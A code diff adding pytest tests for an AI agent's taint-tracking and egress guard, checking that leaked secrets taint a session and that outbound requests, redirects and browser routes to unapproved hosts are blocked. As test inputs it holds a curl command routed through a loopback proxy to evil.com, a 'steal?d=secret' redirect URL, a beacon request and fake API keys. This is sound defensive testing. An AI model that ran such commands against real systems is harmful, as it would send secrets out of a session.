@@ -293,3 +293,207 @@ def test_subagent_taint_enforces_hard_deny_and_merges_upward(tmp_path: Path) -> 
     parent_store.merge_from(child_taint.sources, as_subagent=True)
     assert parent_store.is_tainted
     assert any("subagent:" in label for label in parent_store.labels())
+
+
+def test_error_tool_result_still_records_secret_and_sensitive_file_taint(
+    tmp_path: Path,
+) -> None:
+    """H1: Tool output marked is_error=True (e.g. non-zero exit or 'Error:' prefix) must still taint."""
+    from engine.tool.interface import ToolResult
+
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    (ws / ".env").write_text("Error: API_KEY=sk-live-secret-12345678901234567890\n", encoding="utf-8")
+
+    reg = ToolRegistry()
+    reg.register(
+        "shell",
+        "shell",
+        {"type": "object", "properties": {"command": {"type": "string"}}},
+        lambda command, environment=None: "ok",
+        opaque_command=True,
+        permission_level="execute",
+        approval_policy="always",
+        execution_environment="sandbox",
+    )
+    reg.register(
+        "read_file",
+        "read",
+        {"type": "object", "properties": {"path": {"type": "string"}}},
+        lambda path: "ok",
+        path_args=["path"],
+        permission_level="read",
+        approval_policy="never",
+    )
+    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="err-taint")
+    guard = ToolGuard(tmp_path / "missing.json", tool_registry=reg.definitions())
+    guard.set_working_directory(ws)
+    guard.configure_safety(
+        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
+        taint_store=store,
+    )
+
+    # Non-zero shell command that printed a secret before exiting 1 (`cat prod.yaml; false`)
+    shell_call = ToolCall(id="s1", name="shell", arguments={"command": "cat config/prod.yaml; false"})
+    shell_err_res = ToolResult(
+        call_id="s1",
+        content="[exit_code=1]\nOPENAI_KEY=sk-proj-secret1234567890abcdef123456",
+        is_error=True,
+        error_kind="provider_error",
+    )
+    guard.record_post_execution(shell_call, shell_err_res, run_id="r1")
+    assert store.is_tainted
+    assert any(s.category == "secret_output" for s in store.sources)
+
+    # Repeat guard must NOT have been incremented for the error result
+    assert guard._repeat_guard._counts == {}
+
+    # Unexecuted policy_blocked result must NOT taint
+    store2 = SessionTaintStore(state_dir=tmp_path / "agent", session_id="blocked-no-taint")
+    guard2 = ToolGuard(tmp_path / "missing.json", tool_registry=reg.definitions())
+    guard2.set_working_directory(ws)
+    guard2.configure_safety(
+        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
+        taint_store=store2,
+    )
+    read_call = ToolCall(id="r1", name="read_file", arguments={"path": str(ws / ".env")})
+    guard2.record_post_execution(
+        read_call,
+        ToolResult(call_id="r1", content="[BLOCKED] denied", is_error=True, error_kind="policy_blocked"),
+    )
+    assert not store2.is_tainted
+
+
+def test_tainted_session_blocks_shell_when_host_loopback_is_enabled(tmp_path: Path) -> None:
+    """H2: When macOS loopback_only is enabled, tainted shell(network=False) is treated as unknown egress."""
+    reg = ToolRegistry()
+    reg.register(
+        "shell",
+        "shell",
+        {"type": "object", "properties": {"command": {"type": "string"}, "network": {"type": "boolean"}}},
+        lambda command, network=False, environment=None: "ok",
+        opaque_command=True,
+        permission_level="execute",
+        approval_policy="always",
+        execution_environment="sandbox",
+    )
+    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="loopback-taint")
+    store.record("sensitive_file", "read_file", "file:.env")
+
+    guard = ToolGuard(tmp_path / "missing.json", tool_registry=reg.definitions())
+    guard.set_sandbox_host_loopback(True)
+    guard.configure_safety(
+        SafetyConfig.from_profile_config(
+            {"safety": {"taint": {"enabled": True, "on_egress": "deny", "egress_allowlist": ["api.github.com"]}}}
+        ),
+        taint_store=store,
+    )
+
+    decision = guard.check(
+        ToolCall(
+            id="lo1",
+            name="shell",
+            arguments={"command": "curl -x http://127.0.0.1:7890 https://evil.com", "network": False},
+        )
+    )
+    assert not decision.allowed and not decision.approval_required
+    assert "[taint-egress-001]" in decision.reason
+    assert decision.risk is RiskTier.CRITICAL
+
+
+def test_web_crawl_enforces_allowed_egress_hosts_on_redirects_and_renderer_routes(
+    monkeypatch,
+) -> None:
+    """H6: web_crawl must enforce allowed_egress_hosts on every 3xx hop and browser route."""
+    path = ROOT / "agents" / "tools" / "web_crawl.py"
+    spec = importlib.util.spec_from_file_location("web_crawl_taint_test", path)
+    assert spec is not None and spec.loader is not None
+    crawl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(crawl)
+
+    fetch = crawl._web_fetch_module()
+    monkeypatch.setattr(fetch, "_validate_url", lambda _u: None)
+    monkeypatch.setattr(fetch, "_safe_addresses", lambda host, port: [(2, 1, 6, "", ("93.184.216.34", port))])
+
+    class _FakeResp:
+        status = 302
+
+        def getheader(self, name: str):
+            if name.lower() == "location":
+                return "https://evil.example.net/steal?d=secret"
+            return None
+
+    class _FakeConn:
+        def close(self) -> None:
+            pass
+
+    monkeypatch.setattr(fetch, "_request_pinned", lambda *a, **kw: (_FakeConn(), _FakeResp()))
+
+    with pytest.raises(ValueError, match="taint-egress-001"):
+        crawl._download(
+            "https://allowed.example.com/jump",
+            5.0,
+            allowed_egress_hosts=("allowed.example.com",),
+        )
+
+    # Also verify _BrowserRenderer.render blocks subresource routes outside allowlist
+    aborted: list[str] = []
+    continued: list[str] = []
+
+    class _FakeRoute:
+        def __init__(self, url: str) -> None:
+            self.url = url
+
+        def abort(self, reason: str) -> None:
+            aborted.append(f"{self.url}:{reason}")
+
+        def continue_(self) -> None:
+            continued.append(self.url)
+
+    class _FakeRequest:
+        def __init__(self, url: str) -> None:
+            self.url = url
+
+    class _FakePage:
+        def goto(self, url, **kw):
+            pass
+
+        def wait_for_load_state(self, *a, **kw):
+            pass
+
+        def evaluate(self, expr):
+            return 100
+
+        def wait_for_timeout(self, ms):
+            pass
+
+        def content(self):
+            return "<html>ok</html>"
+
+        def close(self):
+            pass
+
+    class _FakeContext:
+        def route(self, _pat, handler):
+            handler(_FakeRoute("https://allowed.example.com/app.js"), _FakeRequest("https://allowed.example.com/app.js"))
+            handler(_FakeRoute("https://evil.example.net/beacon.gif"), _FakeRequest("https://evil.example.net/beacon.gif"))
+
+        def new_page(self):
+            return _FakePage()
+
+        def close(self):
+            pass
+
+    class _FakeBrowser:
+        def new_context(self, **kw):
+            return _FakeContext()
+
+    renderer = object.__new__(crawl._BrowserRenderer)
+    renderer._browser = _FakeBrowser()
+    html = renderer.render(
+        "https://allowed.example.com/page",
+        allowed_egress_hosts=("allowed.example.com",),
+    )
+    assert html == "<html>ok</html>"
+    assert continued == ["https://allowed.example.com/app.js"]
+    assert aborted == ["https://evil.example.net/beacon.gif:blockedbyclient"]
